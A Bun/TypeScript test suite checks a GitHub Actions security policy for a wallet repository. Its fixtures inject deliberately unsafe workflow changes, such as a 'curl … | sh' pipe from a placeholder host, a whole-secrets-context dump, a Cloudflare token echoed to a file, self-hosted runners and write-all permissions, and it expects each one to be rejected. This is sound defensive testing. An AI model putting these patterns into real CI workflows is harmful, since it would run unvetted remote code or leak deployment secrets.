/**
 * Regression tests for privileged GitHub Actions trust-boundary policy.
 *
 * The policy is fed the real repository inventory (read from the directory, not
 * a list here), so this suite also fails when a workflow is added that quietly
 * takes the self-hosted runner, a privileged trigger, or a partial vendoring
 * step — the gap MCW-V09-131 found in the previous hand-maintained table.
 */
import { describe, expect, test } from "bun:test";
import { readWorkflowSources, type WorkflowSources } from "../../scripts/workflow-inventory";
import { workflowSecurityPolicyFailures } from "../../scripts/workflow-security-policy";

const GITHUB_EXPRESSION = "$" + "{{";
const SHELL_EXPANSION = "$" + "{";

const mutate = (
  sources: WorkflowSources,
  workflow: string,
  search: string,
  replacement: string,
): WorkflowSources => {
  const source = sources[workflow] ?? "";
  expect(source).toContain(search);
  return { ...sources, [workflow]: source.replace(search, replacement) };
};

describe("workflow security policy", () => {
  test("accepts the repository workflows", async () => {
    expect(workflowSecurityPolicyFailures(await readWorkflowSources())).toEqual([]);
  });

  test("inspects every workflow on disk, not a hand-maintained list", async () => {
    const sources = await readWorkflowSources();
    // The three the previous table omitted. They are ordinary hosted workflows,
    // which is exactly why nothing noticed they were unchecked.
    for (const name of ["auto-release.yml", "terminal-ci.yml", "ui-lab.yml"]) {
      expect(Object.keys(sources)).toContain(name);
    }
  });

  test("rejects a new workflow that claims the self-hosted runner", async () => {
    const sources = await readWorkflowSources();
    const added = {
      ...sources,
      "shortcut.yml": [
        "name: Shortcut",
        "on:",
        "  push:",
        "",
        "permissions:",
        "  contents: read",
        "",
        "jobs:",
        "  run:",
        "    runs-on:",
        "      - codebuild-gha-runner-mc-wallet",
        "    steps:",
        "      - run: echo hi",
        "",
      ].join("\n"),
    };

    expect(workflowSecurityPolicyFailures(added)).toEqual([
      ".github/workflows/shortcut.yml must use a hosted runner or declare a reviewed workflow policy",
    ]);
  });

  test("rejects a new workflow that takes a privileged trigger or wide permissions", async () => {
    const sources = await readWorkflowSources();
    const added = {
      ...sources,
      "sync.yml": [
        "name: Sync",
        "on:",
        "  pull_request_target:",
        "",
        "permissions: write-all",
        "",
        "jobs:",
        "  run:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - run: echo hi",
        "",
      ].join("\n"),
    };

    expect(workflowSecurityPolicyFailures(added)).toEqual([
      ".github/workflows/sync.yml must declare a read-only default permissions block",
      ".github/workflows/sync.yml must not request every token permission",
      ".github/workflows/sync.yml must declare a reviewed workflow policy before using pull_request_target:",
    ]);
  });

  test("polices a workflow written with the .yaml extension", async () => {
    // GitHub runs `.yaml` workflows identically. One taking every privileged
    // capability at once must produce the same baseline failures a `.yml` one
    // would; it previously produced none because it never entered the inventory.
    const added = {
      ...(await readWorkflowSources()),
      "zz-probe.yaml": [
        "name: probe",
        "on:",
        "  pull_request_target:",
        "permissions: write-all",
        "jobs:",
        "  evil:",
        "    runs-on: self-hosted",
        "    steps:",
        "      - run: echo pwned",
        "",
      ].join("\n"),
    };

    expect(workflowSecurityPolicyFailures(added)).toEqual([
      ".github/workflows/zz-probe.yaml must declare a read-only default permissions block",
      ".github/workflows/zz-probe.yaml must not request every token permission",
      ".github/workflows/zz-probe.yaml must use a hosted runner or declare a reviewed workflow policy",
      ".github/workflows/zz-probe.yaml must declare a reviewed workflow policy before using pull_request_target:",
    ]);
  });

  test("rejects renaming a policed workflow to the other extension", async () => {
    // Renaming is how a reviewed workflow's own rules would be shed: the file
    // still runs, but under a name no named policy matches.
    const { ["nightly.yml"]: nightly, ...rest } = await readWorkflowSources();

    expect(workflowSecurityPolicyFailures({ ...rest, "nightly.yaml": nightly ?? "" })).toContain(
      ".github/workflows/nightly.yml is missing; its reviewed policy cannot be enforced",
    );
  });

  test("rejects removing a workflow whose privileged behaviour is pinned", async () => {
    const { ["nightly.yml"]: _removed, ...rest } = await readWorkflowSources();

    expect(workflowSecurityPolicyFailures(rest)).toContain(
      ".github/workflows/nightly.yml is missing; its reviewed policy cannot be enforced",
    );
  });

  const cases = [
    {
      name: "rejects fork-capable self-hosted release validation",
      workflow: "ci.yml",
      search: "github.event.pull_request.head.repo.full_name == github.repository",
      replacement: "github.event.pull_request.head.repo.full_name != ''",
      failure:
        "release-validation must reject fork-controlled branches before using the self-hosted runner",
    },
    {
      name: "rejects reintroducing Krusty source vendoring",
      workflow: "ci.yml",
      search: "      - run: bun run vendor:argent",
      replacement: "      - run: bun run vendor:krusty\n      - run: bun run vendor:argent",
      failure:
        ".github/workflows/ci.yml must consume the pinned published Krusty package instead of vendoring source",
    },
    {
      name: "rejects exposing the Chromatic token to the whole UI job",
      workflow: "ui-lab.yml",
      search:
        "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1",
      replacement: `    runs-on: ubuntu-latest\n    env:\n      CHROMATIC_PROJECT_TOKEN: ${GITHUB_EXPRESSION} secrets.CHROMATIC_PROJECT_TOKEN }}\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1`,
      failure:
        ".github/workflows/ui-lab.yml must reference the Chromatic token only in its scoped step environment",
    },
    {
      name: "rejects failing main when optional Chromatic publishing is not configured",
      workflow: "ui-lab.yml",
      search: 'if [ -z "' + "$" + '{CHROMATIC_PROJECT_TOKEN:-}" ]; then',
      replacement: 'if [ -n "' + "$" + '{CHROMATIC_PROJECT_TOKEN:-}" ]; then',
      failure:
        ".github/workflows/ui-lab.yml must expose the Chromatic token only to the main-push publish step",
    },
    {
      name: "rejects release builds without the pinned privacy SDK",
      workflow: "release-build.yml",
      search: "- run: bun run vendor:privacy",
      replacement: "- run: echo privacy-sdk-skipped",
      failure: ".github/workflows/release-build.yml must vendor the pinned privacy SDK",
    },
    {
      name: "rejects privacy vendoring without the Argent contracts",
      workflow: "nightly.yml",
      search: "bun run vendor:argent && bun run vendor:privacy",
      replacement: "bun run vendor:privacy",
      failure: ".github/workflows/nightly.yml must verify the pinned Argent account contracts",
    },
    {
      name: "rejects a moving privacy SDK build runtime",
      workflow: "nightly.yml",
      search: "node-version: 24",
      replacement: "node-version: latest",
      failure: ".github/workflows/nightly.yml must pin Node.js 24 for privacy SDK vendoring",
    },
    {
      // Pinning the Node.js release says nothing about which packages run under
      // it. A vendoring workflow that resolves an executable by name at run time
      // executes unpinned code with the release workspace's write access, before
      // any digest or package check exists to notice what it changed.
      name: "rejects an executable resolved by name in a vendoring workflow",
      workflow: "ci.yml",
      search: "      - run: bun run vendor:privacy",
      replacement: "      - run: npx some-tool\n      - run: bun run vendor:privacy",
      failure:
        ".github/workflows/ci.yml must not run `npx`: it downloads and runs whatever package currently answers that name",
    },
    {
      name: "rejects a downloaded installer piped into a shell during vendoring",
      workflow: "release-build.yml",
      search: "      - run: bun run vendor:privacy",
      replacement:
        "      - run: curl -sSf https://example.invalid/i.sh | sh\n      - run: bun run vendor:privacy",
      failure:
        ".github/workflows/release-build.yml must not run `curl -sSf https://example.invalid/i.sh | sh`: it pipes a downloaded script straight into a shell",
    },
    {
      name: "rejects an unreviewed setup-node action revision",
      workflow: "ci.yml",
      search: "actions/setup-node@820762786026740c76f36085b0efc47a31fe5020",
      replacement: "actions/setup-node@0000000000000000000000000000000000000000",
      failure: ".github/workflows/ci.yml must pin Node.js 24 for privacy SDK vendoring",
    },
    {
      name: "rejects write permission in the self-hosted release build",
      workflow: "release-build.yml",
      search: "build-release:\n    permissions:\n      contents: read",
      replacement: "build-release:\n    permissions:\n      contents: write",
      failure: "self-hosted release builds must have read-only repository permission",
    },
    {
      name: "rejects caller-controlled release checkout refs",
      workflow: "release-build.yml",
      search: "with:\n          fetch-depth: 0\n          fetch-tags: true\n",
      replacement: `with:\n          ref: ${GITHUB_EXPRESSION} inputs.commit_sha }}\n          fetch-depth: 0\n          fetch-tags: true\n`,
      failure: "self-hosted release builds must not pass caller-controlled refs to checkout",
    },
    {
      name: "rejects release publishing that executes checked-out source",
      workflow: "release-build.yml",
      search: "steps:\n      - uses: actions/download-artifact@",
      replacement:
        "steps:\n      - uses: actions/checkout@0000000000000000000000000000000000000000\n      - uses: actions/download-artifact@",
      failure: "the hosted release publisher must not check out or execute wallet source",
    },
    {
      name: "rejects manual store publishing without an immutable tag",
      workflow: "release.yml",
      search: `git ls-remote --exit-code --tags origin "refs/tags/${SHELL_EXPANSION}tag}"`,
      replacement: `git show-ref --verify "refs/heads/${SHELL_EXPANSION}tag}"`,
      failure: "manual store publication must require an existing immutable release tag",
    },
    {
      name: "rejects an unconstrained nightly branch",
      workflow: "nightly.yml",
      search: '[[ ! "$candidate" =~ ^release/v[0-9]+\\.[0-9]+(\\.[0-9]+)?$ ]]',
      replacement: '[[ -z "$candidate" ]]',
      failure: "nightly must constrain configured refs to canonical release branches",
    },
    {
      name: "rejects configured nightly checkout refs",
      workflow: "nightly.yml",
      search:
        "uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - name: Check out resolved release commit",
      replacement: `uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n          ref: ${GITHUB_EXPRESSION} needs.resolve.outputs.branch }}\n      - name: Check out resolved release commit`,
      failure: "self-hosted nightly execution must not pass configured refs to checkout",
    },
    {
      name: "rejects a release checksum step that claims identity with the CI artifact",
      workflow: "release-build.yml",
      search: "      # Self-consistency only:",
      replacement:
        "      # Confirm the released zip is byte-identical to the CI artifact.\n      # Self-consistency only:",
      failure: "release builds must not claim a byte-identical artifact they never compare against",
    },
    // Supply audit F3: the self-hosted jobs run dependency and vendoring code,
    // so the checkout token must not stay in .git/config while they do.
    {
      name: "rejects a self-hosted release build that persists the checkout token",
      workflow: "release-build.yml",
      search: "          persist-credentials: false\n",
      replacement: "",
      failure: "self-hosted release builds must not leave the checkout token in .git/config",
    },
    {
      name: "rejects a self-hosted nightly that persists the checkout token",
      workflow: "nightly.yml",
      search: "          persist-credentials: false\n",
      replacement: "",
      failure: "self-hosted nightly execution must not leave the checkout token in .git/config",
    },
    {
      name: "rejects self-hosted release integration that persists the checkout token",
      workflow: "release-integration.yml",
      search: "          persist-credentials: false\n",
      replacement: "",
      failure: "self-hosted release integration must not leave the checkout token in .git/config",
    },
    {
      name: "rejects self-hosted release integration on a pull request",
      workflow: "release-integration.yml",
      search: 'push:\n    branches: ["release/**"]',
      replacement: "pull_request:\n    branches: [main]",
      failure: "release integration must run only on pushes to release branches",
    },
    // The deploy credential's in-tree half. The enforcing control against a
    // foreign ref is the environment's deployment-branch policy, which lives in
    // repository settings; these keep the workflow from quietly losing the parts
    // of the boundary a diff can show.
    {
      name: "rejects a website deploy whose push filter names more than one branch",
      workflow: "website-deploy.yml",
      search: 'branches: ["',
      replacement: 'branches: ["main", "',
      failure:
        ".github/workflows/website-deploy.yml must trigger on exactly one literal production branch",
    },
    {
      name: "rejects a website deploy that drops the production environment",
      workflow: "website-deploy.yml",
      search: "    environment:\n      name: bramble-production\n      url: https://bramble.fi\n",
      replacement: "",
      failure:
        ".github/workflows/website-deploy.yml must deploy through the reviewed production environment",
    },
  ] as const;

  for (const item of cases) {
    test(item.name, async () => {
      const sources = await readWorkflowSources();
      const changed = mutate(sources, item.workflow, item.search, item.replacement);
      expect(workflowSecurityPolicyFailures(changed)).toContain(item.failure);
    });
  }

  // The website deploy states its production branch once, in its `push` filter,
  // and the policy derives the dispatch guard from it. These two read the branch
  // out of the workflow rather than naming it, so changing the production branch
  // does not require editing this suite — only the workflow.
  const activeBranch = async (): Promise<string> => {
    const source = (await readWorkflowSources())["website-deploy.yml"] ?? "";
    const branch = source.match(/\n {4}branches: \["([^"]+)"\]/)?.[1];
    expect(branch).toBeString();
    return branch ?? "";
  };

  test("rejects a website deploy whose manual-dispatch ref guard is gone", async () => {
    const sources = await readWorkflowSources();
    const branch = await activeBranch();
    const changed = mutate(
      sources,
      "website-deploy.yml",
      '[ "$EVENT_NAME" = "workflow_dispatch" ] && [ "$TRIGGER_REF" != "refs/heads/',
      'if false; then : "',
    );
    expect(workflowSecurityPolicyFailures(changed)).toContain(
      `.github/workflows/website-deploy.yml must reject manual runs outside ${branch}, the branch its push filter names`,
    );
  });

  // The credential rules are positional, not textual. Every one of these four
  // reached the text-matching version that preceded it, each in a different
  // notation. They collapse into one assertion because the parser reports where
  // a value sits, and where a value sits is not a matter of spelling.
  const HOISTS = [
    { name: "dot syntax", body: "secrets.CLOUDFLARE_API_TOKEN" },
    { name: "bracket syntax", body: `secrets["CLOUDFLARE_API_TOKEN"]` },
    { name: "lower case", body: "secrets.cloudflare_api_token" },
    { name: "mixed case in brackets", body: `secrets['Cloudflare_Api_Token']` },
    // Context names are case-insensitive in GitHub expressions too, not just
    // secret names — so the context keyword itself needs covering.
    { name: "capitalised context keyword", body: "Secrets.CLOUDFLARE_API_TOKEN" },
  ] as const;

  for (const item of HOISTS) {
    test(`rejects hoisting the token to job-level env in ${item.name}`, async () => {
      const sources = await readWorkflowSources();
      const changed = mutate(
        sources,
        "website-deploy.yml",
        "    steps:\n",
        `    env:
      LEAKED: ${GITHUB_EXPRESSION} ${item.body} }}
    steps:
`,
      );
      const failures = workflowSecurityPolicyFailures(changed);
      expect(
        failures.some(
          (failure) =>
            failure.includes("must bind the Cloudflare token only at") &&
            failure.includes("not at jobs.deploy.env.LEAKED"),
        ),
      ).toBe(true);
    });
  }

  test("rejects a secrets-context dump in a workflow that never names the credential", async () => {
    const sources = await readWorkflowSources();
    const added = {
      ...sources,
      "leaky.yml": [
        "name: Leaky",
        "on:",
        "  push:",
        "",
        "permissions:",
        "  contents: read",
        "",
        "jobs:",
        "  run:",
        "    runs-on: ubuntu-latest",
        "    env:",
        `      ALL: ${GITHUB_EXPRESSION} toJSON(secrets) }}`,
        "    steps:",
        "      - run: echo hi",
        "",
      ].join("\n"),
    };
    // The point of this case: selecting on the credential's name would return an
    // empty list here and never examine the workflow.
    expect(added["leaky.yml"]).not.toContain("CLOUDFLARE_API_TOKEN");
    expect(workflowSecurityPolicyFailures(added)).toContain(
      ".github/workflows/leaky.yml must not serialise the whole secrets context (at jobs.run.env.ALL)",
    );
  });

  test("rejects the token being read inside a run script", async () => {
    const sources = await readWorkflowSources();
    const leaked = mutate(
      sources,
      "website-deploy.yml",
      "      - name: Deployment summary",
      `      - run: echo ${GITHUB_EXPRESSION} secrets.CLOUDFLARE_API_TOKEN }} > /tmp/x
      - name: Deployment summary`,
    );
    expect(
      workflowSecurityPolicyFailures(leaked).some((failure) =>
        failure.includes("not at jobs.deploy.steps[6].run"),
      ),
    ).toBe(true);
  });

  test("rejects removing the token binding altogether", async () => {
    const sources = await readWorkflowSources();
    const changed = mutate(
      sources,
      "website-deploy.yml",
      `          CLOUDFLARE_API_TOKEN: ${GITHUB_EXPRESSION} secrets.CLOUDFLARE_API_TOKEN }}\n`,
      "",
    );
    expect(workflowSecurityPolicyFailures(changed)).toContain(
      ".github/workflows/website-deploy.yml must bind the Cloudflare token at jobs.deploy.steps[5].env.CLOUDFLARE_API_TOKEN",
    );
  });

  test("fails closed when a workflow cannot be parsed", async () => {
    const sources = await readWorkflowSources();
    const broken = {
      ...sources,
      "website-deploy.yml": `${sources["website-deploy.yml"]}\n  bad: [\n`,
    };
    expect(workflowSecurityPolicyFailures(broken)).toContain(
      ".github/workflows/website-deploy.yml must be parseable YAML so its trust boundaries can be checked",
    );
  });

  test("does not treat the word secrets in prose as a reference", async () => {
    const sources = await readWorkflowSources();
    const changed = mutate(
      sources,
      "website-deploy.yml",
      "      - name: Deployment summary",
      `      - run: echo "no secrets are printed here"
      - name: Deployment summary`,
    );
    expect(workflowSecurityPolicyFailures(changed)).toEqual([]);
  });

  test("rejects a website deploy whose ref guard drifts from its push filter", async () => {
    const sources = await readWorkflowSources();
    const branch = await activeBranch();
    const changed = mutate(
      sources,
      "website-deploy.yml",
      `!= "refs/heads/${branch}"`,
      '!= "refs/heads/some-other-branch"',
    );
    expect(workflowSecurityPolicyFailures(changed)).toContain(
      `.github/workflows/website-deploy.yml must reject manual runs outside ${branch}, the branch its push filter names`,
    );
  });
});
